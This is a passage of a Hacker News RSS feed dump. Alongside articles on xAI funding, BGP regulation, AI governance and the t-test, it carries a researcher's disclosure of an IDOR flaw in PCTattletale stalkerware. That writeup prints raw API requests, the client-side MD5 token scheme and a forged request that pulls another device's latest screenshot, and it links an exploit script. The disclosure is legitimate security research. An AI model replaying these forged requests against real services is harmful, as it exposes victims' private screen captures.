<div id="readability-page-1" class="page"><div><main><div><p><strong>xAI is pleased to announce...</strong></p><p><strong>Our Series B funding round of $6 billion with participation from key investors including Valor Equity Partners, Vy Capital, Andreessen Horowitz, Sequoia Capital, Fidelity Management &amp; Research Company, Prince Alwaleed Bin Talal and Kingdom Holding, amongst others.</strong></p><p>xAI has made significant strides over the past year. From the announcement of the company in July 2023, to the release of <a href="https://x.ai/blog/grok">Grok-1 on X in November</a>, to the recent announcements of the improved <a href="https://x.ai/blog/grok-1.5">Grok-1.5 model with long context capability</a>, to <a href="https://x.ai/blog/grok-1.5v">Grok-1.5V with image understanding</a>, xAI’s model capabilities have improved rapidly. With the <a href="https://x.ai/blog/grok-os">open-source release of Grok-1</a>, xAI has opened doors for advancements in various applications, optimizations, and extensions of the model.</p><p>xAI will continue on this steep trajectory of progress over the coming months, with multiple exciting technology updates and products soon to be announced. The funds from the round will be used to take xAI’s first products to market, build advanced infrastructure, and accelerate the research and development of future technologies.</p><p>xAI is primarily focused on the development of advanced AI systems that are truthful, competent, and maximally beneficial for all of humanity. The company’s mission is to understand the true nature of the universe.</p><p>xAI is hiring for numerous roles and seeks talented individuals ready to join a small team focused on making a meaningful impact on the future of humanity. Those interested can apply today at <a href="https://x.ai/careers">x.ai/careers</a>.</p></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Is regulated BGP security coming? (113 pts)]]></title>
            <link>https://blog.apnic.net/2024/05/23/is-regulated-bgp-security-coming/</link>
            <guid>40487419</guid>
            <pubDate>Mon, 27 May 2024 03:51:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.apnic.net/2024/05/23/is-regulated-bgp-security-coming/">https://blog.apnic.net/2024/05/23/is-regulated-bgp-security-coming/</a>, See on <a href="https://news.ycombinator.com/item?id=40487419">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-content">
                            <p><img width="555" height="202" src="https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-555x202.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d" alt="" decoding="async" fetchpriority="high" srcset="https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-555x202.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 555w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-300x109.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 300w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-1024x373.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 1024w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-768x280.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 768w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-624x227.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 624w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-206x75.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 206w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft-256x93.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 256w, https://blog.apnic.net/wp-content/uploads/2024/04/regulation_ft.png?v=67e959d0b6d848b5807ff93f1562e3fbacfdd7e5234c20bc381bca42e3a2280d 1110w" sizes="(max-width: 555px) 100vw, 555px"></p><p>You may have seen the Internet Society’s (ISOC’s)&nbsp;<a href="https://www.internetsociety.org/blog/2024/04/the-us-fcc-signals-a-dangerous-new-course-on-bgp-security/" target="_blank" rel="noreferrer noopener">response&nbsp;</a>to the US Federal Communications Commission’s&nbsp;(FCC) recently published&nbsp;“<a href="https://docs.fcc.gov/public/attachments/DOC-401676A1.pdf" target="_blank" rel="noreferrer noopener">Draft Declaratory Ruling and Order in the Open Internet Proceeding</a>” where certain language concerning Border Gateway Protocol (BGP) security is sparking some concern within the community. ISOC’s post states this ruling “… strongly implies the FCC’s intention to regulate (BGP) routing security.”</p>



<p>The post casts this as an area of concern, with ISOC and the Global Cyber Alliance (GCA) recommending against regulating BGP security. This is for three stated reasons: </p>



<ol>
<li>The effect regulation often has of slowing progress as the industry reviews its obligations and legal implications</li>



<li>Competitive tension that can arise from regulated behaviour.</li>



<li>Concerns of fragmentation as other economies rush to reflect this decision but implement different strategies.</li>
</ol>



<p>While these risks are real, they are unlikely to prevent the FCC from acting.</p>



<p>Firstly, telecommunications has always been regulated. In recent decades regulators may have tended toward a soft-touch approach. Still, carriers have both protections (in the form of common-carrier defences against the conduct of messages over their systems) and obligations (such as the need to provide lawful interception services under judicial process).</p>



<p>Secondly, the risks to the integrity of the function of the Internet are real. These threats stem from malicious criminal entities, adversarial states, and even from within the economy. They disrupt vital functions of the Internet, which are crucial for basic communications, emergency services, and state operations like power and water delivery.&nbsp;</p>



<p>Given the Internet’s central role in modern society, it’s reasonable to expect actors responsible for configuring BGP to adhere to basic standards of hygiene and documentation for their resources, ensuring their trustworthiness.</p>



<p>Currently, in economies like New Zealand, ISPs are required to report significant routing state changes to authorities or to account for loss of service under cyber threats (such as in Australia where Internet entities can be declared national strategic resources with reporting obligations).</p>



<p>The ISOC / GCA stance is not particularly surprising because few industry organizations in the Internet governance sphere typically advocate for or support increased regulation — industry self-regulation tends to be the default position. However, when it comes to BGP security and the potential risks posed to the state, the light-touch approach may reach the limits of risk that a government is prepared to accept without intervention.</p>



<p>Have a read of the&nbsp;<a href="https://docs.fcc.gov/public/attachments/DOC-401676A1.pdf" target="_blank" rel="noreferrer noopener">FCC report</a>, and the&nbsp;<a href="https://www.internetsociety.org/blog/2024/04/the-us-fcc-signals-a-dangerous-new-course-on-bgp-security/" target="_blank" rel="noreferrer noopener">ISOC / GCA response</a>, and let me know what you think!</p>



<p>The FCC later released a fact sheet “<a href="https://docs.fcc.gov/public/attachments/DOC-402609A1.pdf">Reporting on Border Gateway Protocol Risk Mitigation Progress</a>” with specific ideas for action that will place obligations on the US ISP / BGP community.</p>

                            <!-- DISCUSS ON HN BUTTON: START -->
                            
                                                        <hr>

                            <p id="views-disclaimer">The views expressed by the authors of this blog are their own
                                and do not necessarily reflect the views of APNIC. Please note a <a href="https://blog.apnic.net/?p=395">Code of Conduct</a> applies to this blog.
                            </p>
                        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PcTattletale leaks victims' screen recordings to entire Internet (155 pts)]]></title>
            <link>https://www.ericdaigle.ca/pctattletale-leaking-screen-captures/</link>
            <guid>40486991</guid>
            <pubDate>Mon, 27 May 2024 02:00:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ericdaigle.ca/pctattletale-leaking-screen-captures/">https://www.ericdaigle.ca/pctattletale-leaking-screen-captures/</a>, See on <a href="https://news.ycombinator.com/item?id=40486991">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><section><time datetime="2024-05-22">May 22, 2024</time></section><h2>PCTattletale leaks victims' screen recordings to entire Internet</h2><h3 id="background">Background</h3><p><a href="https://www.pctattletale.com/">PCTattletale</a> is a simple stalkerware app. Rather than the sophisticated monitoring of many <a href="https://techcrunch.com/2024/02/12/new-thetruthspy-stalkerware-victims-is-your-android-device-compromised/">similarly insecure</a> competitors it simply asks for permission to record the targeted device (Android and Windows are supported) on infection. Afterward the observer can log in to an online portal and activate recording, at which point a screen capture is taken on the device and played on the target's browser.</p><p>I recently discovered a serious vulnerability in PCTattletale's API allowing any attacker to obtain the most recent screen capture recorded from any device on which PCTattletale is installed. It is distinct from the IDOR <a href="https://www.vice.com/en/article/m7ezj8/stalkerware-leaking-phone-screenshots-pctattletale">previously discovered by Jo Coscia</a>, and makes it trivial to actually obtain captures from other devices. As usual, Zack Whittaker has <a href="https://techcrunch.com/2024/05/22/spyware-found-on-hotel-check-in-computers/">excellent coverage</a> at TechCrunch. Unfortunately, PCTattletale have ignored Zack and I's attempts at contacting them to fix the issue, <del>so I can't give any more details here to avoid encouraging abuse of the vulnerability. Hopefully the stalkerware author(s) can be bothered to fix the issue soon, at which point I can give a full writeup. In the meantime,</del> if you think you may be a victim of stalkerware, run an antivirus scan — on Windows, Windows Defender seems to catch most known tools, on Android I've heard good things about <a href="https://www.malwarebytes.com/stalkerware">Malwarebytes</a> — and have a look at the excellent advice from the <a href="https://stopstalkerware.org/information-for-survivors/">Coalition Against Stalkerware</a>.</p><h3 id="update-2024-05-26">UPDATE 2024-05-26</h3><p>Well, it's been an eventful few days. Check out <a href="https://maia.crimew.gay/posts/fuckstalkerware-6/">maia arson crimew's blog</a> for details. Given that PCTattletale's entire AWS infrastructure has now been <a href="https://ericdaigle.ca/docs/pctt-amazon-locked.png">locked by Amazon</a>, I can now give my original writeup.</p><h2 id="part-0-setup">Part 0: setup</h2><p>I began by making an account on the website. This occurs in the following request-response, giving us an API key:</p><pre><code><span>METHOD: POST
</span><span>URL https://p200wi0b00.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 74
</span><span>Content-Type: application/json
</span><span>Host: p200wi0b00.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{"Username": "blah@blah.com", "Password": "42d388f8b1db997faaf7dab487f11290"} // MD5 of the password
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Access-Control-Allow-Origin: *
</span><span>Connection: keep-alive
</span><span>Content-Length: 112
</span><span>Content-Type: text/plain; charset=utf-8
</span><span>Date: Tue, 14 May 2024 16:12:35 GMT
</span><span>Strict-Transport-Security: max-age=2592000
</span><span>Via: 1.1 207f5507d6d59dcf535e37d1db1f70bc.cloudfront.net (CloudFront)
</span><span>x-amz-apigw-id: XxMKGGEyiYcEocA=
</span><span>X-Amz-Cf-Id: L-w5nC30_R1FQhALRW93ifWgmgPLB26TE31RLRqZuZDb7iR5Ft1KGg==
</span><span>X-Amz-Cf-Pop: MXP53-P2
</span><span>x-amzn-RequestId: 29cbf7ba-e16b-49a4-9435-323956b0f4e2
</span><span>X-Amzn-Trace-Id: Root=1-66438d73-5fec59847a24356d76502520;Parent=4f04524f333e8710;Sampled=0;lineage=95e70599:0
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>{"APIKey":"89df2e57-2a4b-4e39-800a-8d1cc014d63b","ResponseTime":"2024-05-14T16:12:35.597104+00:00","MemberID":0}
</span></code></pre><p>The API key seems to serve as our account ID.</p><p>Once the account is made, we are given a link to an APK to install on the target device. This installation proceeds as usual for a stalkerware app: we log in to the account we created and give a bunch of required permissions. After that, we can log into the dashboard in the browser and see our devices.</p><h2 id="part-1-screenshot-idor">Part 1: screenshot idor</h2><p>For each device, a thumbnail of a device screenshot is displayed. When we click on one, we see a "screen capture": it actually turns out to be a series of screenshots displayed quickly in a slideshow, creating a sort of stop-motion video. Since I'm using the free trial, I can only see the first few seconds. These screenshots seem like something IDOR-able, so let's take a look at the requests.</p><p>Playing the video, we can see the screenshots being retrieved in the following request-responses:</p><pre><code><span>METHOD: GET
</span><span>URL https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg
</span><span>HEADERS Accept: image/avif,image/webp,*/*
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Host: pctattletalev2.s3-accelerate.amazonaws.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: no-cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Accept-Ranges: bytes
</span><span>Connection: keep-alive
</span><span>Content-Length: 38661
</span><span>Content-Type: image/jpeg
</span><span>Date: Tue, 14 May 2024 17:11:31 GMT
</span><span>ETag: "a4a22ad1c62b70489757567ff678c593"
</span><span>Last-Modified: Mon, 13 May 2024 19:50:32 GMT
</span><span>Server: AmazonS3
</span><span>Via: 1.1 c704491f877b150c768ef14eb188ed46.cloudfront.net (CloudFront)
</span><span>X-Amz-Cf-Id: O0Nsl1S5yP2BPmHtdLIZ_6cARBxZErn-xKRaON7XhQ_B8_HwBG8Wiw==
</span><span>X-Amz-Cf-Pop: EWR53-C2
</span><span>x-amz-id-2: 8wXPc+8xWC9/eXGwVqbDiAwP34lROWR7McJqzVVTOqrzBCtspIr+7cbp83OyuMysICXB+ubBxA0=
</span><span>x-amz-request-id: JRCP4QW6QVSCB6HJ
</span><span>x-amz-server-side-encryption: AES256
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>*the screenshot of my device*
</span></code></pre><p>Looking at the URL, it's in the format (id of the device I added)/(date)/(timestamp).jpg. There's no authentication happening at all here, so this is an IDOR over different device IDs! I later learned this had been independently discovered by Jo Coscia as mentioned above.</p><p>Another interesting note looking at the screenshots is that they aren't taken every second. They are spaced out in seemingly random intervals, mostly concentrated between 1 and 10 seconds. This explains why the "video" in the browser is so choppy.</p><h2 id="part-2-finding-the-latest-screenshot">Part 2: finding the latest screenshot</h2><p>If we know the address of one screenshot for a device, we can reasonably poke around neighbouring timestamps to find the rest of the capture. Unfortunately there are 86400 timestamps per day, so enumerating this across all days and all devices would take forever.</p><p>When we load the devices overview, the thumbnail we're shown is of that device's <em>latest</em> screenshot. I wonder how that's being accessed? Let's reload the page and look at the requests again.</p><p>We find this:</p><pre><code><span>METHOD: POST
</span><span>URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62198/Live/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 44
</span><span>Content-Type: application/json
</span><span>Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{"Token": "07c7aa47c311b2e90b0cc50b53986141"}
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Access-Control-Allow-Origin: *
</span><span>Connection: keep-alive
</span><span>Content-Length: 133
</span><span>Content-Type: text/plain; charset=utf-8
</span><span>Date: Tue, 14 May 2024 17:12:06 GMT
</span><span>Strict-Transport-Security: max-age=2592000
</span><span>Via: 1.1 f6acfb143216fabf7be9b3a603a486ae.cloudfront.net (CloudFront)
</span><span>x-amz-apigw-id: XxU3-Fk9iYcElIQ=
</span><span>X-Amz-Cf-Id: W0ypHoXaeNis5e7yjC1y619qE35BQNfRBPhp1odSFoRiBq6W6sUVjg==
</span><span>X-Amz-Cf-Pop: JFK50-P7
</span><span>x-amzn-RequestId: 0c173b4d-0217-4300-956e-2cf33ad4caaf
</span><span>X-Amzn-Trace-Id: Root=1-66439b65-191b7f0a162b922a6d3de532;Parent=7893959ccf48044c;Sampled=0;lineage=63f6feca:0
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>{"lastScreenShot":"https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg","idleTime":"1715604626"}
</span></code></pre><p>So that's how it gets the most recent screenshot. If we could get this for a device, we could easily get the rest of the capture! Unfortunately it seems to be protected in two ways: the URL contains the API Key (an unguessable UUID), and there's a token.</p><h2 id="part-3-client-side-token-generation">Part 3: client-side token generation</h2><p>While looking for the last request, I noticed a bunch of JavaScript being pulled in from pctattletale.com. Most names seemed pretty innocuous, but on seeing "member.area.dashboard.js" I decided to take a look and see if I could find where that token was coming from. Incredibly, I found the following code for the request to update a device's status:</p><pre data-lang="javascript"><code data-lang="javascript"><span>function </span><span>updateDevice</span><span>(</span><span>device</span><span>, </span><span>index</span><span>) {
</span><span>  </span><span>var </span><span>deviceToken </span><span>= </span><span>md5</span><span>(</span><span>API_KEY </span><span>+ "" + </span><span>device</span><span>.</span><span>DeviceID</span><span>);
</span><span>
</span><span>  </span><span>//  Call Login WebService
</span><span>  </span><span>$</span><span>.</span><span>ajax</span><span>({
</span><span>      method: "</span><span>POST</span><span>",
</span><span>      crossDomain: </span><span>true</span><span>,
</span><span>      contentType: "</span><span>application/json</span><span>",
</span><span>      dataType: "</span><span>json</span><span>",
</span><span>      url: </span><span>AWS_BASE_URL_LIVE </span><span>+ "</span><span>api/pctt/member/</span><span>" + </span><span>API_KEY </span><span>+ "</span><span>/</span><span>" + </span><span>device</span><span>.</span><span>DeviceID </span><span>+ "</span><span>/Live/</span><span>",
</span><span>      data: JSON.</span><span>stringify</span><span>({
</span><span>        Token: </span><span>deviceToken
</span><span>      })
</span><span>
</span><span>    })
</span><span>    .</span><span>success</span><span>(</span><span>function</span><span>(</span><span>data</span><span>) {
</span><span>
</span><span>    [...]
</span><span>
</span><span>    })
</span><span>    .</span><span>fail</span><span>(</span><span>function</span><span>() {
</span><span>
</span><span>    [...]
</span><span>
</span><span>    });
</span></code></pre><p>So the token is generated on the client-side, and is just MD5 of the device ID from the URL appended to the API key from account creation. Knowing this it is trivial to generate my own token and confirm that it matches the one being used in the requests. But I still can't get other devices' last screenshots because the URL and token both have the wrong API key, right?</p><h2 id="part-4-clearly-i-have-too-much-faith">Part 4: clearly I have too much faith</h2><p>Let's give it a try. I make a token using my API key and the device ID one less than mine, and resend the above request with the corresponding url:</p><pre><code><span>METHOD: POST
</span><span>URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62197/Live/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 44
</span><span>Content-Type: application/json
</span><span>Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{"Token": "7b431465c49fc326546d565315773a17"}
</span></code></pre><p>This happily gives me the lastScreenshot response for device ID 62197, which I do not own. It will do so for any device ID regardless of the UUID used in the URL and token.</p><h2 id="part-5-putting-together-an-exploit-script">Part 5: putting together an exploit script</h2><p>Now that we can access any screenshot from any device and know the address of the last screenshot of the most recent recording, it's pretty easy to put together a script to leak the entirety of that recording. There's a minor annoyance in how the screenshots are taken at an irregular interval: we can't just subtract a certain amount of seconds. Instead we'll use a heuristic: we'll start with the last screenshot and subtract one second at a time, downloading from each and seeing if we get a valid photo or the error XML that comes up if no screenshot was taken at that second. If we get the error XML 20 times in a row, we'll assume the recording is over and give up.</p><p>Together with the login and token code, this yields a <a href="https://paste.sr.ht/blob/740b840d0e1d9cf3cf11075e6e78ddde4f812c0c">simple exploit script</a> That downloads the most recent screen capture from every device within the chosen range of IDs.</p><h2 id="part-6-aftermath">Part 6: aftermath</h2><p>As described in better detail in maia's blog linked above, someone took my original post as inspiration and was able to recover PCTattletale's entire database, among other things. While the exploit was unrelated to mine, it was about equally trivial... another shining example of security practices from the stalkerware industry.</p><h3 id="timeline">Timeline</h3><ul><li>2024-05-12: initial analysis</li><li>2024-05-13: proof of concept script written, contacted developers and Zack Whittaker at TechCrunch</li><li>2024-05-17: Zack contacts developers</li><li>2024-05-22: publication here and in TechCrunch, still no response from developers</li><li>2024-05-26: post updates with full writeup</li></ul></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Julia Evans' Git Cheat Sheet [pdf] (286 pts)]]></title>
            <link>https://wizardzines.com/git-cheat-sheet.pdf</link>
            <guid>40486197</guid>
            <pubDate>Sun, 26 May 2024 23:04:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wizardzines.com/git-cheat-sheet.pdf">https://wizardzines.com/git-cheat-sheet.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=40486197">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[AI firms mustn’t govern themselves, say ex-members of OpenAI’s board (176 pts)]]></title>
            <link>https://www.economist.com/by-invitation/2024/05/26/ai-firms-mustnt-govern-themselves-say-ex-members-of-openais-board</link>
            <guid>40485318</guid>
            <pubDate>Sun, 26 May 2024 20:55:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.economist.com/by-invitation/2024/05/26/ai-firms-mustnt-govern-themselves-say-ex-members-of-openais-board">https://www.economist.com/by-invitation/2024/05/26/ai-firms-mustnt-govern-themselves-say-ex-members-of-openais-board</a>, See on <a href="https://news.ycombinator.com/item?id=40485318">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><main role="main" id="content"><article data-test-id="NewArticle" id="new-article-template"><div data-test-id="standard-article-template"><section><h2>For humanity’s sake, regulation is needed to tame market forces, argue Helen Toner and Tasha McCauley</h2></section><section><figure><img fetchpriority="high" width="1280" height="720" decoding="async" data-nimg="1" sizes="(min-width: 960px) 700px, 95vw" srcset="https://www.economist.com/cdn-cgi/image/width=360,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 360w, https://www.economist.com/cdn-cgi/image/width=384,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 384w, https://www.economist.com/cdn-cgi/image/width=480,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 480w, https://www.economist.com/cdn-cgi/image/width=600,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 600w, https://www.economist.com/cdn-cgi/image/width=834,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 834w, https://www.economist.com/cdn-cgi/image/width=960,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 960w, https://www.economist.com/cdn-cgi/image/width=1096,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 1096w, https://www.economist.com/cdn-cgi/image/width=1280,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 1280w, https://www.economist.com/cdn-cgi/image/width=1424,quality=80,format=auto/content-assets/images/20240524_BID001.jpg 1424w" src="https://www.economist.com/cdn-cgi/image/width=1424,quality=80,format=auto/content-assets/images/20240524_BID001.jpg"><figcaption><span>Illustration: Dan Williams</span></figcaption></figure></section><div data-body-id="cp2"><p data-component="paragraph"><span data-caps="initial">C</span><small>AN PRIVATE</small> companies pushing forward the frontier of a revolutionary new technology be expected to operate in the interests of both their shareholders and the wider world? When we were recruited to the board of OpenAI—Tasha in 2018 and Helen in 2021—we were cautiously optimistic that the company’s innovative approach to self-governance could offer a blueprint for responsible <small>AI</small> development. But based on our experience, we believe that self-governance cannot reliably withstand the pressure of profit incentives. With <small>AI</small>’s enormous potential for both positive and negative impact, it’s not sufficient to assume that such incentives will always be aligned with the public good. For the rise of <small>AI</small> to benefit everyone, governments must begin building effective regulatory frameworks now.</p><p data-component="paragraph">If any company could have successfully governed itself while safely and ethically developing advanced <small>AI</small> systems, it would have been <a href="https://www.economist.com/business/2023/11/19/the-sam-altman-drama-points-to-a-deeper-split-in-the-tech-world">OpenAI</a>. The organisation was originally established as a non-profit with a laudable mission: to ensure that <small>AGI</small>, or artificial general intelligence—<small>AI </small>systems that are generally smarter than humans—would benefit “all of humanity”. Later, a for-profit subsidiary was created to raise the necessary capital, but the non-profit stayed in charge. The stated purpose of this <a href="https://www.economist.com/leaders/2023/11/22/the-fallout-from-the-weirdness-at-openai">unusual structure</a> was to protect the company’s ability to stick to its original mission, and the board’s mandate was to uphold that mission. It was unprecedented, but it seemed worth trying. Unfortunately it didn’t work.</p></div></div></article></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The t-test was invented at the Guinness brewery (364 pts)]]></title>
            <link>https://www.scientificamerican.com/article/how-the-guinness-brewery-invented-the-most-important-statistical-method-in/</link>
            <guid>40485313</guid>
            <pubDate>Sun, 26 May 2024 20:55:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.scientificamerican.com/article/how-the-guinness-brewery-invented-the-most-important-statistical-method-in/">https://www.scientificamerican.com/article/how-the-guinness-brewery-invented-the-most-important-statistical-method-in/</a>, See on <a href="https://news.ycombinator.com/item?id=40485313">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p data-block="sciam/paragraph">“One Guinness, please!” says a customer to a barkeep, who flips a branded pint glass and catches it under the tap. The barkeep begins a multistep pour process lasting precisely 119.5 seconds, which, whether it’s a marketing gimmick or a marvel of alcoholic engineering, has become a beloved ritual in Irish pubs worldwide. The result: a rich stout with a perfect froth layer like an earthy milkshake.</p><p data-block="sciam/paragraph">The Guinness brewery has been known for innovative methods ever since founder Arthur Guinness signed a 9,000-year lease in Dublin for £45 a year. For example, a mathematician-turned-brewer invented a chemical technique there after four years of tinkering that gives the brewery’s namesake stout its velvety head. The method, which involves adding nitrogen gas to kegs and to little balls inside cans of Guinness, led to today’s hugely popular “nitro” brews for beer and <a href="https://www.scientificamerican.com/article/how-to-brew-the-perfect-cup-of-coffee-according-to-science/">coffee</a>.</p><p data-block="sciam/paragraph">But the most influential innovation to come out of the brewery by far has nothing to do with beer. It was the birthplace of <a href="https://www.jstor.org/stable/2331554?casa_token=1652dnOSNrEAAAAA%3AI4iWjKpCkwXkSrqiwVAsbsNLTbf6GInl0s3VM9sgZ1G-bYeUzEwaUHM3AzY0_m5SiIRrloH22n0dsDT7ShPAUie65cFhRoO-pWIXfzENzFG7HUKO7FE-">the <i>t</i>-test</a>, one of the most important <a href="https://www.scientificamerican.com/article/statistics-are-being-abused-but-mathematicians-are-fighting-back/">statistical techniques</a> in all of science. When scientists declare their findings “statistically significant,” they very often use a <i>t</i>-test to make that determination. How does this work, and why did it originate in beer brewing, of all places?</p><hr><h2>On supporting science journalism</h2><p>If you're enjoying this article, consider supporting our award-winning journalism by<!-- --> <a href="https://www.scientificamerican.com/getsciam/">subscribing</a>. By purchasing a subscription you are helping to ensure the future of impactful stories about the discoveries and ideas shaping our world today.</p><hr><p data-block="sciam/paragraph">Near the start of the 20th century, Guinness had been in operation for almost 150 years and towered over its competitors as the world’s largest brewery. Until then, quality control on its products consisted of rough eyeballing and smell tests. But the demands of global expansion motivated Guinness leaders to revamp their approach to target consistency and industrial-grade rigor. The company hired a team of brainiacs and gave them latitude to pursue research questions in service of the perfect brew. The brewery became a hub of experimentation to answer an array of questions: Where do the <a href="https://www.scientificamerican.com/article/trouble-brewing-climate-change-closes-in-on-beer-drinkers/">best barley varieties</a> grow? What is the ideal saccharine level in malt extract? How much did the latest ad campaign increase sales?</p><figure data-block="contentful/image"><picture><source media="(min-width: 750px)" srcset="https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=1350 1350w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=2000 2000w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=900 900w" sizes="(min-width: 2000px) 2000px, (min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"><source media="(min-width: 0px)" srcset="https://static.scientificamerican.com/dam/m/5b98540068b3c9a7/original/guinness_graphic1_mobile.png?w=1000 1000w, https://static.scientificamerican.com/dam/m/5b98540068b3c9a7/original/guinness_graphic1_mobile.png?w=1200 1200w, https://static.scientificamerican.com/dam/m/5b98540068b3c9a7/original/guinness_graphic1_mobile.png?w=600 600w, https://static.scientificamerican.com/dam/m/5b98540068b3c9a7/original/guinness_graphic1_mobile.png?w=750 750w" sizes="(min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"><img alt="Chart shows that the probability of observing an average soft resin content of 6 percent in a sample of hop flowers lies below 0.05." decoding="async" loading="lazy" src="https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=900" width="3753" height="2419" srcset="https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=1000 1000w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=1200 1200w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=1350 1350w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=2000 2000w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=600 600w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=750 750w, https://static.scientificamerican.com/dam/m/160d9452d3384cc0/original/guinness_graphic1_desktop.png?w=900 900w" 